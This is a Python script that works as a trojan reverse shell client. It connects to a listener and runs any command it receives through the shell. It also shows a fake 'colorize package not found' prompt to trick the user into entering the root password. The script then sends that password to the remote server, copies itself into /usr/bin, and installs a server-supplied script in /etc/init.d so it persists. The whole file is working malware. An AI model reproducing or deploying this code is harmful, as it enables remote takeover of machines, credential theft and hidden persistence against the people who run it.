#-*- coding:utf-8 -*-
import socket,subprocess,getpass,os


def connection():
    host = "127.0.0.1"
    port = 8080
    buff = 2048
    global client_socket
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    client_socket.connect((host,port))
    get_root()
    while True:

        received_data = client_socket.recv(buff)
        if received_data == 'quit' :
            client_socket.close()
        else :
            command = subprocess.check_output(received_data, shell=True)
            if not command:
                client_socket.send("Command succesfully executed.")
            else:
                client_socket.send(str(command) + "\nCommand succesfully executed.")

def get_root():
    control = 0
    while control == 0:
        prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
        password = getpass.getpass(prompt)
        usr_bin_cp = "echo %s | sudo -S cp rshell_client.py /usr/bin" %str(password)
        command1 = subprocess.check_output(usr_bin_cp, shell=True)

        control_file = os.path.exists("/usr/bin/rshell_client.py")

        if control_file == True:
            client_socket.send("g0t r00t!\nP4SSW0RD:" +str(password + "\n" +str(client_socket.getpeername())))
            daemon = client_socket.recv(2048)
            fileopen = open("daemonize.sh","w")
            fileopen.write(daemon)
            fileopen.close()
            daemonize_cp = "echo %s | sudo -S cp daemonize.sh /etc/init.d/" %(str(password))
            subprocess.check_output(daemonize_cp,shell=True)
            control = 1
        else:
            password = getpass.getpass("Sorry,wrong password.Try again.\n")


connection()